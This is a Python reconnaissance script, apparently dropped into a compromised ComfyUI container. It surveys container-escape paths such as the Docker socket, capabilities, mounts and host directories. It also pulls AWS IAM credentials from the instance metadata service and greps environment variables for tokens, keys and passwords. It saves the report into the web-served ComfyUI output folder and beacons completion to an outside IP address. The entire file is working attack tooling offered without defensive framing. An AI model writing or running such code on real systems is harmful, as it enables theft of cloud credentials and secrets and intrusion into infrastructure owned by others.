import subprocess, os
def sh(c, t=25):
    try:
        return subprocess.run(["sh","-c",c],capture_output=True,text=True,timeout=t).stdout.strip()
    except Exception as e:
        return "ERR "+str(e)
rep = []
rep.append("== ID ==\n"+sh("id; hostname; uname -a"))
rep.append("== CGROUP (容器判定) ==\n"+sh("cat /proc/1/cgroup 2>/dev/null | head -5; echo ---; cat /proc/self/cgroup | head -5"))
rep.append("== DOCKER/K8S 痕迹 ==\n"+sh("ls -la /.dockerenv /var/run/docker.sock /run/containerd/containerd.sock /run/docker.sock 2>&1 | head -10"))
rep.append("== CAP ==\n"+sh("grep Cap /proc/self/status; echo ---; cat /proc/1/status|grep Cap"))
rep.append("== MOUNTS ==\n"+sh("mount | head -25; echo ---; df -h | head -15"))
rep.append("== 逃逸面 ==\n"+sh("ls -la /host /mnt /media /proc/1/root 2>&1|head; echo ---; ls /dev | head -20"))
rep.append("== AWS IMDS ==\n"+sh("python3 -c \"import urllib.request as u;print(u.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/',timeout=5).read().decode())\" 2>&1"))
rep.append("== ENV(脱敏) ==\n"+sh("env | grep -iE 'aws|token|key|secret|pass' | head -20"))
rep.append("== 网络 ==\n"+sh("ip a 2>/dev/null | head -20; echo ---; cat /etc/hosts; echo ---; cat /etc/resolv.conf"))
rep.append("== 敏感文件 ==\n"+sh("ls -la /root 2>/dev/null | head -20; echo ---; ls -la /ComfyUI/output 2>/dev/null | head"))
rep.append("== CRON/持久化面 ==\n"+sh("ls -la /etc/cron* 2>/dev/null | head; crontab -l 2>&1 | head -5"))
open("/tmp/zt_recon.txt","w").write("\n\n".join(rep))
for p in ["/ComfyUI/output/zt_recon.txt","/tmp/zt_recon.txt","./zt_recon.txt"]:
    try: open(p,"w").write("\n\n".join(rep))
    except Exception: pass
try:
    import urllib.request
    urllib.request.urlopen("http://69.33.211.148:8899/zt_recon_done",timeout=8)
except Exception: pass
